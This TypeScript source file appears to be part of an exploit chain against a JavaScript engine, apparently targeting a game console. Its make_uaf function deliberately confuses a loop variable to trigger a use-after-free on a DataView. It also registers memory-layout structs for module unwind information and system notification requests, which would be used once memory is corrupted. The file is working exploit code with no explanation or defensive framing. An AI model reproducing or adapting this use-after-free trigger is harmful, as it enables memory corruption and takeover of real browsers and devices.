import { struct } from './types'

export function make_uaf (arr: DataView) {
  const o = {}
  for (let i in { xx: '' }) {
    // @ts-expect-error need to confuse variable i
    for (i of [arr]);
    // @ts-expect-error need to access it as well
    o[i]
  }
}

struct.register('ModuleInfoForUnwind', [
  { type: 'Uint64', name: 'st_size' },
  { type: 'Uint8', name: 'name[256]' },
  { type: 'Uint64', name: 'eh_frame_hdr_addr' },
  { type: 'Uint64', name: 'eh_frame_addr' },
  { type: 'Uint64', name: 'eh_frame_size' },
  { type: 'Uint64', name: 'seg0_addr' },
  { type: 'Uint64', name: 'seg0_size' },
])

struct.register('NotificationRequest', [
  { type: 'Int32', name: 'type' },
  { type: 'Int32', name: 'reqId' },
  { type: 'Int32', name: 'priority' },
  { type: 'Int32', name: 'msg_id' },
  { type: 'Int32', name: 'target_id' },
  { type: 'Int32', name: 'user_id' },
  { type: 'Int32', name: 'unk1' },
  { type: 'Int32', name: 'unk2' },
  { type: 'Int32', name: 'app_id' },
  { type: 'Int32', name: 'error_num' },
  { type: 'Int32', name: 'unk3' },
  { type: 'Uint8', name: 'use_icon_image_uri' },
  { type: 'Uint8', name: 'message[1024]' },
  { type: 'Uint8', name: 'icon_uri[1024]' },
  { type: 'Uint8', name: 'unk[1024]' },
])
